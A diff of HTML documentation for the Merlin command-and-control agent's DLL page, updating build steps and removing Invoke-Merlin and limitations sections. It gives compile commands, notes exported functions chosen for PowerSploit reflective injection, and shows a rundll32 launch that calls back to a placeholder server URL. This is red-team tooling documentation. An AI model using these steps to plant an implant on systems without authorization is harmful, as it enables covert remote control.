@@ -36,7 +36,7 @@
     
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="PowerShell" href="powershell.html" />
+    <link rel="next" title="Custom Build" href="custom.html" />
     <link rel="prev" title="Command Line Flags" href="cli.html" /> 
 </head>
 
@@ -99,13 +99,9 @@
 <li class="toctree-l2"><a class="reference internal" href="#creating-the-dll">Creating the DLL</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#dll-entry-points">DLL Entry Points</a></li>
 <li class="toctree-l2"><a class="reference internal" href="#execution-with-rundll32-exe">Execution with rundll32.exe</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#invoke-merlin">Invoke-Merlin</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#limitations">Limitations</a></li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="powershell.html">PowerShell</a></li>
 <li class="toctree-l1"><a class="reference internal" href="custom.html">Custom Build</a></li>
-<li class="toctree-l1"><a class="reference internal" href="javascript.html">JavaScript Agent</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Merlin Server</span></p>
 <ul>
@@ -191,8 +187,9 @@
             
   <div class="section" id="dll-agent">
 <h1>DLL Agent<a class="headerlink" href="#dll-agent" title="Permalink to this headline">¶</a></h1>
-<p>Merlin can be compiled into a DLL. The <code class="docutils literal notranslate"><span class="pre">data/bin/dll/merlin.c</span></code> file is a very simple C file with a single function. The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> and <code class="docutils literal notranslate"><span class="pre">Run</span></code>
-functions are exported to facilitate executing the DLL.</p>
+<p>The Merlin Agent can be compiled into a DLL using the <a class="reference external" href="https://github.com/Ne0nd0g/merlin-agent-dll">https://github.com/Ne0nd0g/merlin-agent-dll</a> repository.
+The <code class="docutils literal notranslate"><span class="pre">merlin.c</span></code> file is a very simple C file with a single function.
+The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> and <code class="docutils literal notranslate"><span class="pre">Run</span></code> functions are exported to facilitate executing the DLL.</p>
 <p>The <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> function name was specifically chosen to facilitate use with PowerSploit’s
 <a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a>.
 Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</span></code> requires no modification to run Merlin’s DLL with Invoke-ReflectivePEInjection.</p>
@@ -200,12 +197,12 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <p>If the DLL is compiled on Linux, ensure <code class="docutils literal notranslate"><span class="pre">MinGW-w64</span></code> is installed.</p>
 <div class="section" id="creating-the-dll">
 <h2>Creating the DLL<a class="headerlink" href="#creating-the-dll" title="Permalink to this headline">¶</a></h2>
-<p>The DLL can be created using the Make file with <code class="docutils literal notranslate"><span class="pre">make</span> <span class="pre">agent-dll</span></code></p>
+<p>The DLL can be created using the Make file with <code class="docutils literal notranslate"><span class="pre">make</span></code></p>
 <p>Alternatively, it can be compiled without Make by following these steps:</p>
 <ul class="simple">
 <li><dl class="first docutils">
 <dt>Create the required C archive file:</dt>
-<dd><code class="docutils literal notranslate"><span class="pre">cd</span> <span class="pre">data/bin/dll;go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">../../../cmd/merlinagentdll/main.go</span></code></dd>
+<dd><code class="docutils literal notranslate"><span class="pre">go</span> <span class="pre">build</span> <span class="pre">-buildmode=c-archive</span> <span class="pre">main.go</span></code></dd>
 </dl>
 </li>
 <li><dl class="first docutils">
@@ -275,25 +272,6 @@ Using <code class="docutils literal notranslate"><span class="pre">VoidFunc</spa
 <p><code class="docutils literal notranslate"><span class="pre">rundll32</span> <span class="pre">merlin.dll,Run</span> <span class="pre">https://yourdomian.com:443/</span></code></p>
 <p><strong>NOTE:</strong> Passing a custom URL only works when using cmd.exe and fails when using powershell.exe</p>
 </div>
-<div class="section" id="invoke-merlin">
-<h2>Invoke-Merlin<a class="headerlink" href="#invoke-merlin" title="Permalink to this headline">¶</a></h2>
-<p>The compiled DLL can be inserted into the <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> script.
-Check the [README](../powershell/README.MD) in the <cite>powershell</cite> directory for
-additional details.</p>
-</div>
-<div class="section" id="limitations">
-<h2>Limitations<a class="headerlink" href="#limitations" title="Permalink to this headline">¶</a></h2>
-<p>It is important to note that the DLL is currently in the
-Proof-of-Concept stage. Because of this, there is no way to provide a
-different Merlin server URL when calling <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin</span></code>.</p>
-<p><code class="docutils literal notranslate"><span class="pre">Invoke-Merlin</span></code> will only call back to the Merlin server at
-127.0.0.1. because that is the hard coded value. Future work will
-facilitate specifying the value at compile time or when executing the
-script. Work is in progress to overcome this issue.</p>
-<p>One option to overcome this is to hard-code in the target Merlin server
-address into the <code class="docutils literal notranslate"><span class="pre">url</span></code> variable of the <code class="docutils literal notranslate"><span class="pre">cmd/merlinagent/main.go</span></code> prior
-to creating the C archive file.</p>
-</div>
 </div>
 
 
@@ -304,7 +282,7 @@ to creating the C archive file.</p>
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="powershell.html" class="btn btn-neutral float-right" title="PowerShell" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="custom.html" class="btn btn-neutral float-right" title="Custom Build" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
         <a href="cli.html" class="btn btn-neutral float-left" title="Command Line Flags" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
